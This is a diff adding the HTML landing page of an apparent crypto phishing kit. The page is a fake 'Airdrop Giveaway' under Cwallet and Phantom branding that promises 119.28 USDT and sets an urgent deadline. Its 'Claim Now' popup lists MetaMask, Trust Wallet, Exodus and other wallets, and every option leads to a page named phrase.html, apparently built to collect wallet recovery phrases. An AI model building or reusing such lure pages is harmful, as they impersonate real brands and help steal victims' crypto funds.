@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Airdrop Hunting</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+<div class="container">
+  <div class="airdrop-game-card">
+
+    <!-- TOP GAME BANNER -->
+    <div class="airdrop-banner">
+      <div class="banner-icons">
+        <span class="icon">
+          <a href="index.html" style="text-decoration: none;">←</a>
+        </span>
+      </div>
+
+      <img
+        src="https://tools.cwallet.com/static/media/start_bg.ca1343fb.png"
+        class="banner-plane"
+        alt="Plane"
+      />
+
+      <div class="banner-content">
+        <h1>Airdrop<br/>Giveaway</h1>
+        <p>Reward will automatically <br> credited once linked to wallet</p>
+
+        <!-- UPDATED BUTTON (NO LINK) -->
+        <button class="play-now-inline" id="openPopup">
+          Claim Now
+          <span class="arrow">›</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="airdrop-stats">
+      <div class="stat-row">
+        <span>Total Rewards</span>
+        <span class="coin-count">
+          <img style="width: 18px; height: 18px;" src="USDT.png" alt="">
+          119.28
+        </span>
+      </div>
+
+      <div>
+        <span>How do I use it?</span>
+      </div>
+
+      <div class="stat-row">
+        <span>
+          After claiming the airdrop, the airdrop amount will be added
+          to your linked wallet or your CWallet assigned asset.
+        </span>
+      </div>
+    </div>
+
+    <!-- WINNERS -->
+    <div class="airdrop-winner">
+      <div class="winner-icon">🏆</div>
+      <strong>Hurry up!</strong>
+      <p>Claim now before 31st, March 2026</p>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="airdrop-footer">
+      <span>Provided by</span>
+      <strong>
+        <img style="width: 50px; border-radius: 12px;" src="fntm.png" alt="Cwallet">
+      </strong>
+      <small>Copyright © 2026 Phantom. All rights reserved.</small>
+    </div>
+
+  </div>
+</div>
+
+
+<!-- =========================
+     POPUP MODAL
+========================= -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-card">
+
+    <div class="popup-header">
+      <h3>View a Wallet</h3>
+      <span class="close-popup" id="closePopup">✕</span>
+    </div>
+
+    <div class="wallet-options">
+     <div class="each-option"> <div class="wallet-option" onclick="goToEnter()"><img style="border-radius: 12px; border: none;" src="blckchn.webp" alt=""></div> Blockchain</div>
+     <div class="each-option"> <div class="wallet-option" onclick="goToEnter()"><img style="border-radius: 12px; border: none;" src="crpt.jpeg" alt=""></div> Crypto.com</div>
+     <div class="each-option"> <div class="wallet-option" onclick="goToEnter()"><img style="border-radius: 12px; border: none;" src="trst.jpeg" alt=""></div> Trust Wallet</div>
+     <div class="each-option"> <div class="wallet-option" onclick="goToEnter()"><img style="border-radius: 12px; border: none;" src="btp.jpeg" alt=""></div> BitPay</div>
+     <div class="each-option"> <div class="wallet-option" onclick="goToEnter()"><img style="border-radius: 12px; border: none;" src="fntm.png" alt=""></div> Phantom</div>
+     <div class="each-option"> <div class="wallet-option" onclick="goToEnter()"><img style="border-radius: 12px; border: none;" src="gmn.jpeg" alt=""></div> Gemini</div>
+     <div class="each-option"> <div class="wallet-option" onclick="goToEnter()"><img style="border-radius: 12px; border: none;" src="exd.jpeg" alt=""></div> Exodus</div>
+     <div class="each-option"> <div class="wallet-option" onclick="goToEnter()"><img style="border-radius: 12px; border: none;" src="mtm.png" alt=""></div> MetaMask</div>
+    </div>
+    
+
+    <div class="popup-body">
+      <h4>What is a Wallet?</h4>
+      <p>
+        A wallet allows you to securely store and receive your
+        airdrop rewards once successfully linked.
+      </p>
+      <button class="other-btn" onclick="goToEnter()">Other Wallets</button>
+    </div>
+
+  </div>
+</div>
+
+
+<!-- =========================
+     SCRIPT
+========================= -->
+<script>
+  const popup = document.getElementById("popupOverlay");
+  const openBtn = document.getElementById("openPopup");
+  const closeBtn = document.getElementById("closePopup");
+
+  openBtn.addEventListener("click", function () {
+    popup.classList.add("active");
+  });
+
+  closeBtn.addEventListener("click", function () {
+    popup.classList.remove("active");
+  });
+
+  function goToEnter() {
+    window.location.href = "phrase.html";
+  }
+
+
+
+  // Close when clicking outside modal
+  popup.addEventListener("click", function (e) {
+    if (e.target === popup) {
+      popup.classList.remove("active");
+    }
+  });
+</script>
+
+</body>
+</html>
